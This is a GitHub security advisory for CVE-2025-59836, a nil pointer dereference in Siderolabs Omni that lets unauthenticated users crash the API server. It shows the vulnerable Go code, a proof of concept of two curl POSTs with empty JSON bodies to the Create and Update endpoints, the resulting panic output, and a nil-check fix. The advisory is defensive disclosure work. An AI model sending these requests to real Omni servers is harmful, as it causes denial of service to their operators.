# [M] Omni is Vulnerable to DoS via Empty Create/Update Resource Requests

## Summary
Severity: Medium
Advisory: GHSA-4p3p-cr38-v5xp
CVE: CVE-2025-59836
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2025-10-13
Source: https://github.com/advisories/GHSA-4p3p-cr38-v5xp
Type: github-advisory

## Affected
- Go: `github.com/siderolabs/omni` — affected >=1.1.0-beta.0 <1.1.5
- Go: `github.com/siderolabs/omni` — affected >=0 <1.0.2

## Details
## Summary

A nil pointer dereference vulnerability in the Omni Resource Service allows unauthenticated users to cause a server panic and denial of service by sending empty create/update resource requests through the API endpoints.

## Details

The vulnerability exists in the `isSensitiveSpec` function which calls `grpcomni.CreateResource` without checking if the resource's metadata field is nil. When a resource is created with an empty `Metadata` field, the `CreateResource` function attempts to access `resource.Metadata.Version` causing a segmentation fault.

### Vulnerable Code

The `isSensitiveSpec` function in `/src/internal/backend/server.go`:

```go
func isSensitiveSpec(resource *resapi.Resource) bool {
    res, err := grpcomni.CreateResource(resource)  // No nil check on resource.Metadata
    if err != nil {
        return false
    }
    // ... rest of function
}
```

The `CreateResource` function expects `resource.Metadata` to be non-nil:

```go
func CreateResource(resource *resources.Resource) (cosiresource.Resource, error) {
    if resource.Metadata.Version == "" {  // PANIC: nil pointer dereference
        resource.Metadata.Version = "1"
    }
    // ... rest of function
}
```

The `UpdateResource` function has the same issue - it also calls `CreateResource` internally and expects `resource.Metadata` to be non-nil:

```go
func (s *ResourceServer) Update(ctx context.Context, in *resapi.UpdateRequest) (*resapi.UpdateResponse, error) {
    // ... validation code ...
    obj, err := CreateResource(in.Resource)  // Same vulnerability here
    if err != nil {
        return nil, err
    }
    // ... rest of function
}
```

### Affected Endpoints

- `resourceServerCreate` - Create Resource API endpoint
- `resourceServerUpdate` - Update Resource API endpoint

Both endpoints call `isSensitiveSpec` which triggers the vulnerability when processing empty resources.

## PoC

Send empty resource requests to the affected API endpoints:

```bash
# Create endpoint
curl -X POST "https://your-omni-instance/api/omni.resources.ResourceService/Create" \
  -H "Content-Type: application/json" \
  -d '{}'

# Update endpoint  
curl -X POST "https://your-omni-instance/api/omni.resources.ResourceService/Update" \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Expected Result**: Server panic with segmentation fault:

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x293d970]

goroutine 3305 [running]:
github.com/siderolabs/omni/internal/backend/grpc.CreateResource(0x3495420?)
        /src/internal/backend/grpc/resource.go:364 +0x20
```

## Impact

- **Vulnerability Type**: Denial of Service (DoS)
- **Severity**: High - Complete API server crash requiring manual restart if no restart policy is applied.
- **Authentication**: None required (unauthenticated)
- **Complexity**: Low (simple HTTP request)

## Mitigation

Add nil checks in the `isSensitiveSpec` function:

```go
func isSensitiveSpec(resource *resapi.Resource) bool {
    if resource == nil || resource.Metadata == nil {
        return false
    }
    res, err := grpcomni.CreateResource(resource)
    if err != nil {
        return false
    }
    // ... rest of function
}
```

## Credits
- @1c3t0rm
- @nicomda

## References
- https://github.com/siderolabs/omni/security/advisories/GHSA-4p3p-cr38-v5xp
- https://nvd.nist.gov/vuln/detail/CVE-2025-59836
- https://github.com/siderolabs/omni/commit/1396083f766a1b0380e9949968d7fc17b7afecaa
- https://github.com/siderolabs/omni/commit/1fd954af64985a8b3dbf5b11deddbf7cd953f5ae
- https://github.com/siderolabs/omni
- https://pkg.go.dev/vuln/GO-2025-4021
